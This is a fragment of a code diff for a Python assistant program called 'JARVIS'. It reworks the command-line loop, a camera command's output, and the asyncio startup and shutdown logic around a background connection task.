+                f"{seconds:g} seconds"
+            )
+
+            print(
+                f"[CAMERA] Target device = "
+                f"{device_id}"
+            )
+
+            continue
+
+        # ====================================================
+        # UNKNOWN
+        # ====================================================
+
+        print(
+            f"[ERROR] Unknown command: "
+            f"{command}"
         )
 
-        if not keep_running:
-            return
+        print(
+            "Type 'help' for commands."
+        )
 
 
 # ============================================================
@@ -1469,50 +1531,45 @@ async def command_loop():
 
 async def main():
 
-    command_task = asyncio.create_task(
-        command_loop()
+    connection_task = asyncio.create_task(
+        connection_loop()
     )
 
-    while not command_task.done():
+    try:
 
-        if not connected:
+        await cli_loop()
 
-            await connect_to_render()
+    finally:
 
-            if command_task.done():
-                break
-
-            print(
-                f"[RENDER] "
-                f"Reconnecting in "
-                f"{RECONNECT_DELAY}s..."
-            )
-
-            await asyncio.sleep(
-                RECONNECT_DELAY
-            )
-
-        else:
-
-            await asyncio.sleep(
-                0.5
-            )
-
-    if not command_task.done():
-
-        command_task.cancel()
+        connection_task.cancel()
 
         try:
 
-            await command_task
+            await connection_task
 
         except asyncio.CancelledError:
 
             pass
 
+        except Exception:
+            pass
+
+        global connected
+
+        connected = False
+
+        try:
+
+            import cv2
+
+            cv2.destroyAllWindows()
+
+        except Exception:
+            pass
+
 
 # ============================================================
-# ENTRY POINT
+# ENTRY
 # ============================================================
 
 if __name__ == "__main__":
@@ -1530,3 +1587,4 @@ if __name__ == "__main__":
         print(
             "JARVIS stopped."
         )
+
